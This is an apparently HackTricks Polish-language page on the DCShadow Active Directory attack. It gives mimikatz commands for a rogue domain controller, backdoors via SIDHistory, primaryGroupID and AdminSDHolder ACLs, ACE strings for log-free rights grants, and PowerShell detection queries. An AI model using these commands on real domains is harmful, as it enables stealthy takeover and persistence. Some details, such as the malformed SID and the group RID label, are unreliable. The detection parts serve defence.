# DCShadow

{{#include ../../banners/hacktricks-training.md}}


## Podstawowe informacje

Rejestruje **nowy kontroler domeny** w AD i używa go do **wypchnięcia atrybutów** (SIDHistory, SPNs...) do określonych obiektów, **nie pozostawiając żadnych logów** dotyczących **modyfikacji**. Potrzebujesz uprawnień **DA** i musisz znajdować się wewnątrz **root domain**.\
Pamiętaj, że jeśli użyjesz nieprawidłowych danych, pojawią się bardzo nieprzyjemne logi.<sup>[[2]](#references)</sup>

Aby przeprowadzić atak, potrzebujesz 2 instancji mimikatz. Jedna z nich uruchomi serwery RPC z uprawnieniami SYSTEM (musisz wskazać tutaj zmiany, które chcesz wprowadzić), a druga instancja będzie używana do wypchnięcia wartości:
```bash:mimikatz1 (RPC servers)
!+
!processtoken
lsadump::dcshadow /object:username /attribute:Description /value="My new description"
```

```bash:mimikatz2 (push) - Needs DA or similar
lsadump::dcshadow /push
```
Zauważ, że **`elevate::token`** nie zadziała w sesji `mimikatz1`, ponieważ podnosi uprawnienia wątku, a my musimy podnieść **uprawnienia procesu**.\
Możesz również wybrać obiekt „LDAP”: `/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`

Możesz wprowadzić zmiany jako DA lub użytkownik z następującymi minimalnymi uprawnieniami:

- W **obiekcie domeny**:
- _DS-Install-Replica_ (Dodawanie/usuwanie repliki w domenie)
- _DS-Replication-Manage-Topology_ (Zarządzanie topologią replikacji)
- _DS-Replication-Synchronize_ (Synchronizacja replikacji)
- Obiekt **Sites** (oraz jego elementy podrzędne) w **kontenerze Configuration**:
- _CreateChild i DeleteChild_
- Obiekt **komputera zarejestrowanego jako DC**:
- _WriteProperty_ (nie Write)
- **Obiekt docelowy**:
- _WriteProperty_ (nie Write)

Możesz użyć [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1), aby nadać te uprawnienia użytkownikowi bez uprawnień (zauważ, że pozostawi to pewne logi). Jest to znacznie bardziej restrykcyjne niż posiadanie uprawnień DA.\
Na przykład: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose` Oznacza to, że nazwa użytkownika _**student1**_, po zalogowaniu na komputerze _**mcorp-student1**_, ma uprawnienia DCShadow do obiektu _**root1user**_.

## Używanie DCShadow do tworzenia backdoorów
```bash:Set Enterprise Admins in SIDHistory to a user
lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519
```

```bash:Chage PrimaryGroupID (put user as member of Domain Administrators)
lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
```

```bash:Modify ntSecurityDescriptor of AdminSDHolder (give Full Control to a user)
#First, get the ACE of an admin already in the Security Descriptor of AdminSDHolder: SY, BA, DA or -519
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Admin SDHolder,CN=System,DC=moneycorp,DC=local")).psbase.Objec tSecurity.sddl
#Second, add to the ACE permissions to your user and push it using DCShadow
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<whole modified ACL>
```
### Nadużycie primary group, luki w enumeracji i wykrywanie

- `primaryGroupID` jest oddzielnym atrybutem od listy `member` grupy. DCShadow/DSInternals mogą zapisać go bezpośrednio (np. ustawić `primaryGroupID=512` dla **Domain Admins**) bez egzekwowania przez LSASS lokalnie, ale AD nadal **przenosi** użytkownika: zmiana PGID zawsze usuwa członkostwo z poprzedniej primary group (tak samo dla każdej grupy docelowej), więc nie można zachować członkostwa w starej primary group.<sup>[[1]](#references)</sup>
- Domyślne narzędzia uniemożliwiają usunięcie użytkownika z jego bieżącej primary group (`ADUC`, `Remove-ADGroupMember`), dlatego zmiana PGID zwykle wymaga bezpośrednich zapisów do katalogu (DCShadow/`Set-ADDBPrimaryGroup`).
- Raportowanie członkostwa jest niespójne:
- **Uwzględnia** członków wynikających z primary group: `Get-ADGroupMember "Domain Admins"`, `net group "Domain Admins"`, ADUC/Admin Center.
- **Pomija** członków wynikających z primary group: `Get-ADGroup "Domain Admins" -Properties member`, ADSI Edit podczas inspekcji `member`, `Get-ADUser <user> -Properties memberOf`.
- Sprawdzanie rekurencyjne może pomijać członków primary group, jeśli sama **primary group jest zagnieżdżona** (np. PGID użytkownika wskazuje zagnieżdżoną grupę znajdującą się wewnątrz Domain Admins); `Get-ADGroupMember -Recursive` ani rekurencyjne filtry LDAP nie zwrócą takiego użytkownika, chyba że rekurencja jawnie rozwiązuje primary groups.
- Sztuczki DACL: atakujący mogą **odmówić ReadProperty** dla `primaryGroupID` użytkownika (lub dla atrybutu `member` grup innych niż chronione przez AdminSDHolder), ukrywając efektywne członkostwo przed większością zapytań PowerShell; `net group` nadal rozwiąże członkostwo. Grupy chronione przez AdminSDHolder zresetują takie odmowy.

Przykłady wykrywania/monitorowania:
```powershell
# Find users whose primary group is not the default Domain Users (RID 513)
Get-ADUser -Filter * -Properties primaryGroup,primaryGroupID |
Where-Object { $_.primaryGroupID -ne 513 } |
Select-Object Name,SamAccountName,primaryGroupID,primaryGroup
```

```powershell
# Find users where primaryGroupID cannot be read (likely denied via DACL)
Get-ADUser -Filter * -Properties primaryGroupID |
Where-Object { -not $_.primaryGroupID } |
Select-Object Name,SamAccountName
```
Cross-check uprzywilejowane grupy, porównując dane wyjściowe `Get-ADGroupMember` z `Get-ADGroup -Properties member` lub ADSI Edit, aby wykryć rozbieżności wprowadzone przez `primaryGroupID` lub ukryte atrybuty.<sup>[[1]](#references)</sup>

## Shadowception - Nadawanie uprawnień DCShadow za pomocą DCShadow (bez logów zmodyfikowanych uprawnień)

Musimy dołączyć następujące ACE z SID naszego użytkownika na końcu:<sup>[[2]](#references)</sup>

- W obiekcie domeny:
- `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)`
- `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- W obiekcie komputera atakującego: `(A;;WP;;;UserSID)`
- W obiekcie użytkownika docelowego: `(A;;WP;;;UserSID)`
- W obiekcie Sites w kontenerze Configuration: `(A;CI;CCDC;;;UserSID)`

Aby pobrać bieżący ACE obiektu: `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=loca l")).psbase.ObjectSecurity.sddl`

Zauważ, że w tym przypadku musisz wprowadzić **kilka zmian,** a nie tylko jedną. Dlatego w sesji **mimikatz1** (serwer RPC) użyj parametru **`/stack` przy każdej zmianie**, którą chcesz wprowadzić. Dzięki temu wystarczy tylko raz użyć **`/push`**, aby wykonać wszystkie odłożone zmiany na rogue serverze.

[**Więcej informacji o DCShadow na ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)

## References

- [1] [TrustedSec - Adventures in Primary Group Behavior, Reporting, and Exploitation](https://trustedsec.com/blog/adventures-in-primary-group-behavior-reporting-and-exploitation)
- [2] [DCShadow write-up in ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)

{{#include ../../banners/hacktricks-training.md}}
